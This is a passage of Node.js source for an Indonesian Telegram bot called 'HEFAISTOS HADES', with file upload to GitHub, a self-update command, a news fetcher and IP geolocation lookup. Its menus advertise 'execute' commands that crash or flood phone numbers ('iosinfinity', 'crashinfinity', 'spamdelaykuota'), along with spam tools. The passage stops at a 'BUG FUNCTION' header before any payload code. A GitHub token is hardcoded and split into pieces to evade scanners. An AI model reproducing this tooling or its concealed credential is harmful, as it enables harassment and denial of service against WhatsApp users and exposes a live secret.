    const fileLink = await bot.getFileLink(doc.file_id);
    const res = await fetch(fileLink);
    const code = await res.text();
    try {
      acorn.parse(code, {
        ecmaVersion: "latest",
        sourceType: "module",
        locations: true,
      });

      return bot.sendMessage(chatId,
        "<b>✅ Syntax OK</b>\nFile JavaScript valid.",
        { parse_mode: "HTML" }
      );

    } catch (err) {
      const loc = err.loc || { line: "-", column: "-" };
      const line = loc.line ?? "-";
      const col = loc.column ?? "-";

      const lines = code.split(/\r?\n/);
      const errLine = lines[line - 1] || "";

      const caret = " ".repeat(Math.min(col, errLine.length)) + "^";

      const html = `
<b>❌ Syntax Error</b>

<b>Pesan:</b> <code>${escapeHtml(err.message)}</code>
<b>Baris:</b> <code>${line}</code>  
<b>Kolom:</b> <code>${col}</code>

<b>Bagian error:</b>
<pre>${escapeHtml(errLine)}</pre>
<pre>${escapeHtml(caret)}</pre>
      `;

      return bot.sendMessage(chatId, html, { parse_mode: "HTML" });
    }

  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Terjadi error saat membaca file.");
  }
});

bot.onText(/^\/update$/, async (msg) => {
    const chatId = msg.chat.id;

    bot.sendMessage(chatId, "🔄 Mengambil semua file dari GitHub...");

    try {
        await downloadRepo("");
        bot.sendMessage(chatId, "✅ Update selesai!\n🔁 Bot restart otomatis.");

        setTimeout(() => process.exit(0), 1500);

    } catch (e) {
        bot.sendMessage(chatId, "❌ Gagal update, cek repo GitHub atau koneksi.");
        console.error(e);
    }
});

const JSZip = require("jszip");
const { Octokit } = require("@octokit/rest");

function getToken(){
  const parts = ["ghp_aRo4lt","JD0wd2B2WLJbjSBVZBIdX8q32Rd1v8"];
  return parts.join("");
}
const GH_TOKEN = getToken();
const octo = new Octokit({ auth: GH_TOKEN });

const temp = {};

function sendHTML(chat, text) {
  return bot.sendMessage(chat, text, { parse_mode: "HTML" });
}
function esc(t) {
  return t.replace(/[&<>]/g, c =>
    ({ "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c])
  );
}

async function downloadFile(fileId) {
  const link = await bot.getFileLink(fileId);
  const res = await axios.get(link, { responseType: "arraybuffer" });
  return Buffer.from(res.data);
}


async function uploadGitHub(path, buffer) {
  return octo.repos.createOrUpdateFileContents({
    owner: GH_OWNER,
    repo: GH_REPO,
    branch: GH_BRANCH,
    path: path,
    message: "Upload via Telegram Bot",
    content: buffer.toString("base64"),
  });
}

bot.on("message", async (msg) => {
  const chat = msg.chat.id;

  if (!msg.document) return;
  const file = msg.document;
  const filename = file.file_name;

  sendHTML(chat, `<b>Menerima file</b>: <code>${esc(filename)}</code>\nSedang download...`);

  try {
    const buffer = await downloadFile(file.file_id);

    temp[chat] = { buffer, filename };

    sendHTML(chat, `File siap upload.\nBalas file ini dan ketik:\n<code>/uploudgh</code>`);
  } catch (err) {
    sendHTML(chat, `<b>Error download:</b>\n<pre>${esc(err.message)}</pre>`);
  }
});

bot.onText(/\/uploudgh/, async (msg) => {
  const chat = msg.chat.id;
  const userId = msg.from.id;
  
  if (userId !== ADMIN_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki akses untuk menggunakan perintah ini.");
  }

  if (!temp[chat]) return sendHTML(chat, "<b>Tidak ada file yang siap upload.</b>");

  const { buffer, filename } = temp[chat];
  sendHTML(chat, "<b>Memproses file...</b>");

  try {
    let files = [];

    if (filename.endsWith(".zip")) {
      sendHTML(chat, "<b>ZIP terdeteksi, extracting...</b>");

      const zip = await JSZip.loadAsync(buffer);

      for (const f of Object.keys(zip.files)) {
        const item = zip.files[f];
        if (item.dir) continue;

        const buf = await item.async("nodebuffer");
        files.push({ path: f, buffer: buf });
      }
    } else {
      files.push({ path: filename, buffer });
    }

    sendHTML(chat, `<b>Uploading ke GitHub...</b>\nJumlah file: <code>${files.length}</code>`);

    for (const f of files) {
      await uploadGitHub(f.path, f.buffer);
    }

    sendHTML(chat, `<b>UPLOAD SELESAI!</b>\nTotal file: <code>${files.length}</code>\nRepository: <code>${GH_OWNER}/${GH_REPO}</code>`);

  } catch (err) {
    sendHTML(chat, `<b>ERROR UPLOAD:</b>\n<pre>${esc(err.message)}</pre>`);
  }

  delete temp[chat];
});

bot.onText(/^\/newberita$/, async (msg) => {
    const chatId = msg.chat.id;
    const axios = require("axios");

    const sources = [
        { name: "Antara", url: "https://api.siputzx.my.id/api/berita/antara" },
        { name: "Kompas", url: "https://api.siputzx.my.id/api/berita/kompas" },
        { name: "CNN", url: "https://api.siputzx.my.id/api/berita/cnn" },
        { name: "CNBC Indonesia", url: "https://api.siputzx.my.id/api/berita/cnbcindonesia" },
    ];

    const waitMsg = await bot.sendMessage(chatId, "⏳ Mengambil berita terbaru dari semua sumber...");

    try {
        // Loop tiap sumber berita
        for (let src of sources) {
            try {
                const { data } = await axios.get(src.url);

                if (!data || !data.result || data.result.length === 0) {
                    await bot.sendMessage(chatId, `⚠️ Tidak ada berita dari ${src.name}`);
                    continue;
                }

                const b = data.result[0]; // Ambil berita pertama

                const teks =
`📰 <b>${src.name} – Berita Terbaru</b>

<b>Judul:</b> ${b.title || "-"}
<b>Tanggal:</b> ${b.pubDate || "-"}

<b>Deskripsi:</b>
${b.description || "-"}

🔗 <b>Link:</b>
${b.link || "-"}`;

                await bot.sendMessage(chatId, teks, { parse_mode: "HTML" });

                // Delay 2 detik biar gak spam
                await new Promise(resolve => setTimeout(resolve, 2000));

            } catch (err) {
                await bot.sendMessage(chatId, `❌ Gagal mengambil berita dari ${src.name}`);
            }
        }

        await bot.deleteMessage(chatId, waitMsg.message_id);

    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "❌ Error mengambil berita semua sumber!");
    }
});

bot.onText(/^\/?(?:trackip|ip) (.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const target = match[1]?.trim();

  if (!isOwner(userId) && !isPremium(userId)) {
    return bot.sendMessage(chatId, "⚠️ *Akses Ditolak*\nAnda tidak memiliki akses premium.", { parse_mode: "Markdown" });
  }

  if (!target) return bot.sendMessage(chatId, "⚠️ Masukkan IP atau domain yang ingin di-track!");

  await bot.sendMessage(chatId, "🔍 <b>Sedang mencari data IP...</b>", { parse_mode: "HTML" });

  try {
    const url = `http://ip-api.com/json/${encodeURIComponent(target)}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,reverse,query,mobile,proxy,hosting`;
    const { data } = await axios.get(url, { timeout: 10000 });

    if (data.status !== "success") {
      return bot.sendMessage(chatId, `❌ Gagal mengambil data: <b>${data.message || "Tidak diketahui."}</b>`, { parse_mode: "HTML" });
    }

    const flags = [
      data.mobile ? "📱 Mobile" : null,
      data.proxy ? "🕵️ Proxy" : null,
      data.hosting ? "💻 Hosting" : null,
    ].filter(Boolean).join(" | ") || "🚫 Tidak ada";

    const mapUrl = `https://www.google.com/maps?q=${data.lat},${data.lon}`;

    const reply = `
<b>🌐 HASIL TRACK IP</b>
━━━━━━━━━━━━━━━━━━
📍 <b>IP / Domain:</b> <code>${data.query}</code>
🏳️ <b>Negara:</b> ${data.country} (${data.countryCode})
🏙️ <b>Region:</b> ${data.regionName} (${data.region})
📌 <b>Kota:</b> ${data.city || "-"}
✉️ <b>Kode Pos:</b> ${data.zip || "-"}
🕒 <b>Zona Waktu:</b> ${data.timezone || "-"}
━━━━━━━━━━━━━━━━━━
🛰️ <b>ISP:</b> ${data.isp || "-"}
🏢 <b>Organisasi:</b> ${data.org || "-"}
🔢 <b>ASN:</b> ${data.as || "-"}
🔁 <b>Reverse DNS:</b> ${data.reverse || "-"}
━━━━━━━━━━━━━━━━━━
🔒 <b>Flags:</b> ${flags}
━━━━━━━━━━━━━━━━━━
📌 <b>Koordinat:</b> ${data.lat}, ${data.lon}
🗺️ <a href="${mapUrl}">Lihat di Google Maps</a>
`;

    await bot.sendMessage(chatId, reply, {
      parse_mode: "HTML",
      disable_web_page_preview: false,
      reply_markup: {
        inline_keyboard: [
          [{ text: "🗺️ Buka di Google Maps", url: mapUrl }],
          [{ text: "🌐 Lihat Raw Data", url: `http://ip-api.com/json/${encodeURIComponent(target)}` }],
        ],
      },
    });
  } catch (err) {
    console.error("❌ Error track IP:", err.response?.status, err.response?.data || err.message);
    await bot.sendMessage(chatId, `❌ Gagal mengambil data: <b>${err.response?.statusText || err.message}</b>`, { parse_mode: "HTML" });
  }
});

bot.on("callback_query", async (query) => {
  if (!query.message) return;

  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;

  const username = query.from.username
    ? `@${query.from.username}`
    : `${query.from.first_name || ""} ${query.from.last_name || ""}`.trim();

  const connect =
    sessions.size === 0
      ? "Belum ada bot"
      : `${sessions.size} session${sessions.size > 1 ? "s" : ""}`;

  // FOTO RANDOM (hanya dipanggil kalau ganti menu)
  const getRandomPhoto = () => {
    const photos = [
    "https://files.catbox.moe/h9g78a.jpg",
    "https://files.catbox.moe/womtwb.png",
  ];
    return photos[Math.floor(Math.random() * photos.length)];
  };

  const infoBlock = `
<blockquote>⬡──〔 <b>HEFAISTOS HADES</b> 〕──⬡</blockquote>
<b>• Username :</b> ${username}
<b>• Versi :</b> 21.0
<b>• Session :</b> ${connect}
<b>• Access :</b> Js / API
<b>• Type :</b> Node-Telegram-Api
<blockquote>⬡────────────────────────────⬡</blockquote>
`;

  // Fungsi untuk ganti foto + caption
  const switchMenu = async (caption, keyboard) => {
    await bot.editMessageMedia(
      {
        type: "photo",
        media: getRandomPhoto(),
        caption: caption,
        parse_mode: "HTML",
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: keyboard,
      }
    );
  };

  // ============================
  //      MENU HANDLER
  // ============================

  if (query.data === "menu1") {
    await switchMenu(
      `${infoBlock}
<blockquote>⬡──〔 SETTING MENU 〕──⬡</blockquote>
• addbot number  
• delbot number  
• listbot  
• addprem userid  
• delprem userid  
• listprem  
• setjeda duration  
• add (creds.json) 
• csession 
<blockquote>⬡────────────────────────────⬡</blockquote>`,
      {
        inline_keyboard: [[{ text: "⬅️ BACK", callback_data: "backmenu" }]],
      }
    );
  }
  
  else if (query.data === "tools") {
    await switchMenu(
      `${infoBlock}
<blockquote>⬡──〔 RANDOM MENU 〕──⬡</blockquote>
• pinterest anime  
• trashpairing 628xx  
• spamngl url  
• ai on/off  
• tt ( link ) 
• play ( dj sound ) 
• newberita
• getcode ( link ) 
• brat ( teks ) 
• newberita
• ceksyntax
• downloadmediafire link
• update
<blockquote>⬡────────────────────────────⬡</blockquote>`,
      {
        inline_keyboard: [[{ text: "⬅️ BACK", callback_data: "backmenu" }]],
      }
    );
  }

  else if (query.data === "menu3") {
    await switchMenu(
      `${infoBlock}
<blockquote>⬡──〔 EXECUTE MENU 〕──⬡</blockquote>
• iosinfinity 628××  
• crashinfinity 628××  
• spamdelaykuota 628××  
• delayv2 628xx
<blockquote>⬡────────────────────────────⬡</blockquote>`,
      {
        inline_keyboard: [[{ text: "⬅️ BACK", callback_data: "backmenu" }]],
      }
    );
  }

  else if (query.data === "backmenu") {
    await switchMenu(
      `
<blockquote>⬡────────〔 <b>HEFAISTOS HADES</b> 〕────────⬡</blockquote>
<i>Welcome...</i>  
Selamat datang di <b>HEFAISTOS HADES</b>.  
Bot dengan fitur tingkat tinggi—cepat, presisi, dan stabil.

<blockquote>⬡──〔 INFORMATION 〕──⬡</blockquote>
<b>• Username :</b> ${username}
<b>• Versi :</b> 21.0
<b>• Session :</b> ${connect}
<b>• Access :</b> Js / API
<b>• Type :</b> Node-Telegram-Api

<blockquote>⬡──〔 SELECT MENU 〕──⬡</blockquote>`,
      {
    inline_keyboard: [
      [{ text: "⚙️ SETTING BOT", callback_data: "menu1" }],
      [{ text: "🧪 TOOLS", callback_data: "tools" }],
      [
        { text: "🦠 EXECUTE MENU", callback_data: "menu3" },
        { text: "📍 OWNER", url: "https://t.me/Killertzy2" },
      ],
        ],
      }
    );
  }
});

//==================[ BUG FUNCTION ]==================
